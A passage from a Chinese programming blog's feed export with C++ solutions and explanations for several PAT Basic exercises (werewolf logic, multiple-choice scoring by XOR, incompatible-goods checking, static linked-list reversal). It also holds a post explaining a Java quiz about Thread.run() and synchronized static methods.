<td style="text-align:center">延迟的回文数 （20 分）</td>
<td style="text-align:center"><code>reverse()</code>反转函数需要<code>&lt;algorithm&gt;</code>库支持</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="类型十四：中级模拟"><a href="#类型十四：中级模拟" class="headerlink" title="类型十四：中级模拟"></a>类型十四：中级模拟</h1><p>比简单模拟要难些，但需要引起注意。</p>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1058</td>
<td style="text-align:center">选择题 （20 分）</td>
<td style="text-align:center">按照格式读取更简单</td>
</tr>
<tr>
<td style="text-align:center">B1089</td>
<td style="text-align:center"><strong>1089 狼人杀-简单版 （20 分）</strong></td>
<td style="text-align:center">逻辑分析</td>
</tr>
<tr>
<td style="text-align:center">B1073</td>
<td style="text-align:center"><strong>1073 多选题常见计分法 （20 分）</strong></td>
<td style="text-align:center">借助<code>xor</code>（异或）解决多选半对问题</td>
</tr>
</tbody>
</table>
<h2 id="1089-狼人杀-简单版-（20-分）"><a href="#1089-狼人杀-简单版-（20-分）" class="headerlink" title="1089 狼人杀-简单版 （20 分）"></a>1089 狼人杀-简单版 （20 分）</h2><p>以下文字摘自《灵机一动·好玩的数学》：“狼人杀”游戏分为狼人、好人两大阵营。在一局“狼人杀”游戏中，1 号玩家说：“2 号是狼人”，2 号玩家说：“3 号是好人”，3 号玩家说：“4 号是狼人”，4 号玩家说：“5 号是好人”，5 号玩家说：“4 号是好人”。已知这 5 名玩家中有 2 人扮演狼人角色，有 2 人说的不是实话，有狼人撒谎但并不是所有狼人都在撒谎。扮演狼人角色的是哪两号玩家？<br>本题是这个问题的升级版：已知 N 名玩家中有 2 人扮演狼人角色，有 2 人说的不是实话，有狼人撒谎但并不是所有狼人都在撒谎。要求你找出扮演狼人角色的是哪几号玩家？<br><strong>输入格式：</strong><br>输入在第一行中给出一个正整数 N（5≤N≤100）。随后 N 行，第 i 行给出第 i 号玩家说的话（1≤i≤N），即一个玩家编号，用正号表示好人，负号表示狼人。<br><strong>输出格式：</strong><br>如果有解，在一行中按递增顺序输出 2 个狼人的编号，其间以空格分隔，行首尾不得有多余空格。如果解不唯一，则输出最小序列解 —— 即对于两个序列 A=a[1],…,a[M] 和 B=b[1],…,b[M]，若存在 0≤k&lt;M 使得 a[i]=b[i] （i≤k），且 a[k+1]&lt;b[k+1]，则称序列 A 小于序列 B。若无解则输出 No Solution。</p>
<p><strong>输入样例 1：</strong></p>
<blockquote>
<p>5<br>-2<br>+3<br>-4<br>+5<br>+4</p>
</blockquote>
<p><strong>输出样例 1：</strong></p>
<blockquote>
<p>1 4</p>
</blockquote>
<p><strong>输入样例 2：</strong></p>
<blockquote>
<p>6<br>+6<br>+3<br>+1<br>-5<br>-2<br>+4</p>
</blockquote>
<p><strong>输出样例 2（解不唯一）：</strong></p>
<blockquote>
<p>1 5</p>
</blockquote>
<p><strong>输入样例 3：</strong></p>
<blockquote>
<p>5<br>-2<br>-3<br>-4<br>-5<br>-1</p>
</blockquote>
<p><strong>输出样例 3：</strong></p>
<blockquote>
<p>No Solution</p>
</blockquote>
<h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><ul>
<li>分析：每个人说的数字保存在v数组中，i从1～n、j从i+1～n遍历，分别假设i和j是狼人，a数组表示该人是狼人还是好人，等于1表示是好人，等于-1表示是狼人。k从1～n分别判断k所说的话是真是假，k说的话和真实情况不同（即v[k] * a[abs(v[k])] &lt; 0）则表示k在说谎，则将k放在lie数组中；遍历完成后判断lie数组，如果说谎人数等于2并且这两个说谎的人一个是好人一个是狼人（即a[lie[0]] + a[lie[1]] == 0）表示满足题意，此时输出i和j并return，否则最后的时候输出No Solution～</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v(n+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">cin</span> &gt;&gt; v[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; lie, a(n + <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            a[i] = a[j] = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= n; k++)</span><br><span class="line">                <span class="keyword">if</span> (v[k] * a[<span class="built_in">abs</span>(v[k])] &lt; <span class="number">0</span>) lie.push_back(k);</span><br><span class="line">            <span class="keyword">if</span> (lie.size() == <span class="number">2</span> &amp;&amp; a[lie[<span class="number">0</span>]] + a[lie[<span class="number">1</span>]] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">" "</span> &lt;&lt; j;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"No Solution"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="1073-多选题常见计分法-（20-分）"><a href="#1073-多选题常见计分法-（20-分）" class="headerlink" title="1073 多选题常见计分法 （20 分）"></a>1073 多选题常见计分法 （20 分）</h2><p>批改多选题是比较麻烦的事情，有很多不同的计分方法。有一种最常见的计分方法是：如果考生选择了部分正确选项，并且没有选择任何错误选项，则得到 50% 分数；如果考生选择了任何一个错误的选项，则不能得分。本题就请你写个程序帮助老师批改多选题，并且指出哪道题的哪个选项错的人最多。<br><strong>输入格式：</strong><br>输入在第一行给出两个正整数 N（≤1000）和 M（≤100），分别是学生人数和多选题的个数。随后 M 行，每行顺次给出一道题的满分值（不超过 5 的正整数）、选项个数（不少于 2 且不超过 5 的正整数）、正确选项个数（不超过选项个数的正整数）、所有正确选项。注意每题的选项从小写英文字母 a 开始顺次排列。各项间以 1 个空格分隔。最后 N 行，每行给出一个学生的答题情况，其每题答案格式为 <code>(选中的选项个数 选项1 ……)</code>，按题目顺序给出。注意：题目保证学生的答题情况是合法的，即不存在选中的选项数超过实际选项数的情况。<br><strong>输出格式：</strong><br>按照输入的顺序给出每个学生的得分，每个分数占一行，输出小数点后 1 位。最后输出错得最多的题目选项的信息，格式为：<code>错误次数 题目编号（题目按照输入的顺序从1开始编号）-选项号</code>。如果有并列，则每行一个选项，按题目编号递增顺序输出；再并列则按选项号递增顺序输出。行首尾不得有多余空格。如果所有题目都没有人错，则在最后一行输出 <code>Too simple</code>。</p>
<p><strong>输入样例 1：</strong></p>
<blockquote>
<p>3 4<br>3 4 2 a c<br>2 5 1 b<br>5 3 2 b c<br>1 5 4 a b d e<br>(2 a c) (3 b d e) (2 a c) (3 a b e)<br>(2 a c) (1 b) (2 a b) (4 a b d e)<br>(2 b d) (1 e) (1 c) (4 a b c d)</p>
</blockquote>
<p><strong>输出样例 1：</strong></p>
<blockquote>
<p>3.5<br>6.0<br>2.5<br>2 2-e<br>2 3-a<br>2 3-b</p>
</blockquote>
<p><strong>输入样例 2：</strong></p>
<blockquote>
<p>2 2<br>3 4 2 a c<br>2 5 1 b<br>(2 a c) (1 b)<br>(2 a c) (1 b)</p>
</blockquote>
<p><strong>输出样例 2：</strong></p>
<blockquote>
<p>5.0<br>5.0<br>Too simple</p>
</blockquote>
<h3 id="关键点-12"><a href="#关键点-12" class="headerlink" title="关键点"></a>关键点</h3><ul>
<li>用二进制来解决该问题，涉及异或，或等操作，EDCBA可以用二进制(11111)来表示，这样的好处是，直接解决了该问题最核心的一点，半对的判断，因为异或的结果为0，说明，是全部正确的；不为零，则分为有错或者半对，其中这个结果明确了哪些位（即选项）是错误的；另外，半对是不全导致的，那么半对的判断则需要借助<code>或</code>来判断–<code>（异或结果 | 正确答案） == 正确答案</code>。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxm = <span class="number">110</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1010</span>;</span><br><span class="line"><span class="keyword">struct</span> question&#123;</span><br><span class="line">    <span class="keyword">int</span> full;<span class="comment">//总得分</span></span><br><span class="line">    <span class="keyword">double</span> half;<span class="comment">//半分</span></span><br><span class="line">    <span class="keyword">int</span> cnt;<span class="comment">//选项个数</span></span><br><span class="line">    <span class="keyword">int</span> right;<span class="comment">//正确个数</span></span><br><span class="line">    <span class="keyword">int</span> answer;</span><br><span class="line">&#125;q[maxm];</span><br><span class="line"><span class="keyword">int</span> a[maxm][<span class="number">5</span>] = &#123;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M, N;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;N, &amp;M);</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;q[i].full, &amp;q[i].cnt, &amp;q[i].right);</span><br><span class="line">        q[i].half = (<span class="keyword">double</span>)q[i].full / <span class="number">2.0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; q[i].right; j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">" %c)"</span>, &amp;ch);</span><br><span class="line">            q[i].answer += <span class="number">1</span> &lt;&lt; (ch - <span class="string">'a'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> maxi = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> num;</span><br><span class="line">        <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; M; j++)&#123;</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"(%d"</span>, &amp;num);</span><br><span class="line">            <span class="keyword">int</span> answer = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; num; k++)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">" %c)"</span>, &amp;ch);</span><br><span class="line">                answer += <span class="number">1</span> &lt;&lt; (ch - <span class="string">'a'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> el = answer ^ q[j].answer;</span><br><span class="line">            <span class="keyword">if</span> (el)&#123;<span class="comment">//异或不为0，说明答案不全或者错误</span></span><br><span class="line">                <span class="keyword">if</span> ((answer | q[j].answer) == q[j].answer) sum += q[j].half;<span class="comment">//或为0，答案不全</span></span><br><span class="line">                <span class="keyword">if</span> (el)&#123;<span class="comment">//记录错误选项</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">5</span>; k++)&#123;</span><br><span class="line">                        a[j][k] += ((el &gt;&gt; k) &amp; <span class="number">1</span>);</span><br><span class="line">                        maxi = a[j][k] &gt; maxi ? a[j][k] : maxi;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sum += q[j].full;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%.1f\n"</span>, sum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (maxi == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Too simple\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (a[i][j] == maxi)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%d %d-%c\n"</span>, maxi,i+<span class="number">1</span>,j+<span class="string">'a'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="类型十五：常用stl"><a href="#类型十五：常用stl" class="headerlink" title="类型十五：常用stl"></a>类型十五：常用stl</h1><p>PAT最常用的考点，需要注意。</p>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1090</td>
<td style="text-align:center"><strong>危险品装箱 （25 分））</strong></td>
<td style="text-align:center">PAT甲级题目，去年考试原题，当时错了1分</td>
</tr>
</tbody>
</table>
<h2 id="1090-危险品装箱-（25-分）"><a href="#1090-危险品装箱-（25-分）" class="headerlink" title="1090 危险品装箱 （25 分）"></a>1090 危险品装箱 （25 分）</h2><p>集装箱运输货物时，我们必须特别小心，不能把不相容的货物装在一只箱子里。比如氧化剂绝对不能跟易燃液体同箱，否则很容易造成爆炸。<br>本题给定一张不相容物品的清单，需要你检查每一张集装箱货品清单，判断它们是否能装在同一只箱子里。<br><strong>输入格式：</strong><br>输入第一行给出两个正整数：$N (≤10^4)$ 是成对的不相容物品的对数；M (≤100) 是集装箱货品清单的单数。<br>随后数据分两大块给出。第一块有 N 行，每行给出一对不相容的物品。第二块有 M 行，每行给出一箱货物的清单，格式如下：</p>
<blockquote>
<p>K G[1] G[2] … G[K]</p>
</blockquote>
<p>其中 K (≤1000) 是物品件数，G[i] 是物品的编号。简单起见，每件物品用一个 5 位数的编号代表。两个数字之间用空格分隔。<br><strong>输出格式：</strong><br>对每箱货物清单，判断是否可以安全运输。如果没有不相容物品，则在一行中输出 Yes，否则输出 No。<br><strong>输入样例：</strong></p>
<blockquote>
<p>6 3<br>20001 20002<br>20003 20004<br>20005 20006<br>20003 20001<br>20005 20004<br>20004 20006<br>4 00001 20004 00002 20003<br>5 98823 20002 20003 20006 10010<br>3 12345 67890 23333</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>No<br>Yes<br>Yes</p>
</blockquote>
<h3 id="注意点-7"><a href="#注意点-7" class="headerlink" title="注意点"></a>注意点</h3><ul>
<li><p>因为每一个物品不只有一个键值，所以应该声明为<code>map&lt;int, set&lt;int&gt;&gt; mp;</code>类型存储匹配对。</p>
</li>
<li><p>对于最后的判断，应该对每次找出来的set中的每一个元素判断，是否出现在清单中。</p>
</li>
</ul>
<p><strong>完整代码</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, M, K;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;N, &amp;M);</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;&gt; mp;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;x, &amp;y);</span><br><span class="line">        mp[x].insert(y);</span><br><span class="line">        mp[y].insert(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;K);</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; K; j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</span><br><span class="line">            s.insert(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">bool</span> secure = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> a : s)&#123;<span class="comment">//物品清单中的元素</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> b : mp[a])&#123;<span class="comment">//所对应的匹配对中的每一个元素</span></span><br><span class="line">                <span class="keyword">if</span> (s.find(b) != s.end())&#123;<span class="comment">//清单中不含匹配对中的元素</span></span><br><span class="line">                    secure = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (secure) <span class="built_in">printf</span>(<span class="string">"Yes\n"</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"No\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="类型十六：链表"><a href="#类型十六：链表" class="headerlink" title="类型十六：链表"></a>类型十六：链表</h1><ul>
<li><p>伪链表（也叫<strong>静态链表</strong>），他和链表区别是，本质上是数组，维护了链表的链式关系，但是操作它可以按照数组的方式，那么有些问题就会变得简单。</p>
</li>
<li><p>链表结构，掌握链表的增删改查等基本操作，很重要。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1025</td>
<td style="text-align:center"><strong>反转链表 （25 分）</strong></td>
<td style="text-align:center">静态链表</td>
</tr>
<tr>
<td style="text-align:center">B1075</td>
<td style="text-align:center">链表元素分类 （25 分）</td>
<td style="text-align:center">静态链表</td>
</tr>
</tbody>
</table>
<h2 id="1025-反转链表-（25-分）"><a href="#1025-反转链表-（25-分）" class="headerlink" title="1025 反转链表 （25 分）"></a>1025 反转链表 （25 分）</h2><p>给定一个常数 K 以及一个单链表 L，请编写程序将 L 中每 K 个结点反转。例如：给定 L 为 1→2→3→4→5→6，K 为 3，则输出应该为 3→2→1→6→5→4；如果 K 为 4，则输出应该为 4→3→2→1→5→6，即最后不到 K 个元素不反转。</p>
<p><strong>输入格式：</strong><br>每个输入包含 1 个测试用例。每个测试用例第 1 行给出第 1 个结点的地址、结点总个数正整数 $N (≤10^5)$、以及正整数 $K (≤N)$，即要求反转的子链结点的个数。结点的地址是 5 位非负整数，NULL 地址用 −1 表示。<br>接下来有 N 行，每行格式为：</p>
<blockquote>
<p>Address Data Next</p>
</blockquote>
<p>其中 Address 是结点地址，Data 是该结点保存的整数数据，Next 是下一结点的地址。<br><strong>输出格式：</strong><br>对每个测试用例，顺序输出反转后的链表，其上每个结点占一行，格式与输入相同。<br><strong>输入样例：</strong></p>
<blockquote>
<p>00100 6 4<br>00000 4 99999<br>00100 1 12309<br>68237 6 -1<br>33218 3 00000<br>99999 5 68237<br>12309 2 33218</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>00000 4 33218<br>33218 3 12309<br>12309 2 00100<br>00100 1 99999<br>99999 5 68237<br>68237 6 -1</p>
</blockquote>
<h3 id="关键点-13"><a href="#关键点-13" class="headerlink" title="关键点"></a>关键点</h3><ul>
<li><p>这种题存在技巧，如果按照链表的方式直接操作，那么可能会涉及链表的插入删除等操作，而且会很复杂，但是如果利用一种<strong>伪链表（也叫静态链表）</strong>，他和链表区别是，本质上是数组，维护了链表的链式关系，但是操作它可以按照数组的方式，那么有些问题就会变得简单。</p>
</li>
<li><p>利用静态链表反转，直接将每一个地址顺序存储到数组中，将其对应的数据按照散列的方式存储。</p>
</li>
<li><p>反转时，需要找到反转规律。例如k=4时：</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> | <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> | <span class="number">8</span> <span class="number">9</span></span><br><span class="line"><span class="number">3</span> <span class="number">2</span> <span class="number">1</span> <span class="number">0</span> | <span class="number">7</span> <span class="number">6</span> <span class="number">5</span> <span class="number">4</span> | <span class="number">8</span> <span class="number">9</span></span><br></pre></td></tr></table></figure>
<p>  对于每一行索引i与k的关系：</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>交换k<span class="number">-1</span>(索引<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span>交换k<span class="number">-2</span>(索引<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>交换<span class="number">2</span>k<span class="number">-1</span>(索引<span class="number">7</span>)</span><br><span class="line"><span class="number">5</span>交换<span class="number">2</span>k<span class="number">-2</span>(索引<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<p>  这是一个数组反转问题了，只需要折半反转就行了。<br>  可以利用一个二次循环解决：</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设数组a[]为静态链表</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len &amp;&amp; (i + K - <span class="number">1</span>) &lt; len;i+=K)&#123;<span class="comment">//对每一组反转</span></span><br><span class="line">    <span class="keyword">int</span> x = i / K + <span class="number">1</span>;<span class="comment">//得出k前系数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; K / <span class="number">2</span>;j++)&#123;<span class="comment">//组内反转</span></span><br><span class="line">        swap(a[i+j],a[x*K<span class="number">-1</span>-j]);<span class="comment">//反转</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>输出，只需要a和data数组就可以解决输出问题了，注意最后一个节点的下一个地址为<code>-1</code>。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>PAT</tag>
        <tag>PAT-Basic</tag>
      </tags>
  </entry>
  <entry>
    <title>一道Java多线程问题</title>
    <url>/2019/12/25/%E4%B8%80%E9%81%93Java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>这道题在我2015年初学Java时遇到，至今已过去4年多了，也收到了200多的赞和很多回复，对我的Java学习起到了很好的正反馈作用，那么现在就来看下这道题目到底是怎么回事。</p>
<p>以下JAVA程序的输出是什么（）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *https://www.nowcoder.com/questionTerminal/3b463ebec8404ad9b1b288859f124543?toCommentId=59907</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloSogou</span></span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] a)</span></span>&#123;</span><br><span class="line">         Thread t=<span class="keyword">new</span> Thread()&#123;</span><br><span class="line">             <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;Sogou();&#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     t.run();</span><br><span class="line">     System.out.print(<span class="string">"Hello"</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">Sogou</span><span class="params">()</span></span>&#123;</span><br><span class="line">     System.out.print(<span class="string">"Sogou"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">A. HelloSogou</span><br><span class="line">B. SogouHello</span><br><span class="line">C. Hello</span><br><span class="line">D. 结果不确定</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h1><p>第一，我觉得误区有两个：一个是run和start区别，<code>Thread.run()</code>是调用方法，<code>Thread. start()</code>是启动线程；另一个是锁持有问题。这个题是调用方法，和多线程就无关。本题只有一个线程，持有HelloSogou.class锁。那么，就是第二个问题了：同步方法调用另一个同步方法的锁问题？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span>  <span class="title">methodA</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">methodB</span><span class="params">(<span class="keyword">int</span>  a）&#123;</span></span></span><br><span class="line"><span class="function"><span class="params">   methodA(a, <span class="number">0</span>)</span></span>; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>首先要明白两个问题，<strong>1.锁的对象是谁？2.谁持有了锁？</strong></p>
<p>假设方法A和B是在同一个类Test中的两个方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test  t=<span class="keyword">new</span> Test(); </span><br><span class="line">t.methodB();</span><br></pre></td></tr></table></figure>
<p>调用methodB()方法，获得锁，锁是对象<code>t</code>；锁谁持有？当前线程（不可以说是methodB持有该锁），methodB又调用methodA，也需要锁<code>t</code>，该线程已持有<code>t</code>，当然可以直接调用methodA。 </p>
<p>类比到此题，只有一个主线程，调用main，持有<code>HelloSogou.class</code>锁，那当然可以直接调用Sogou方法。</p>
<p>第二，如果是<code>t.statrt()</code>，那么这个题，<strong>静态同步函数的锁是该类的字节码文件.class。</strong>此题中，main函数和Sogou方法都是static的，所以持有相同<code>锁 HelloSogou.class</code>，那么，在main线程（main  是一个线程也是一个进程  ）中又开了一个线程，调用Sogou方法，锁会冲突。</p>
<p>所以我的分析是：调用main函数（一个线程），main函数开启另一个线程，并启动，但是main函数和Sogou方法是同一个锁，所以main函数执行完毕后才会释放锁，Sogou方法才会执行，这就是为什么，换成start，是HelloSogou。 </p>
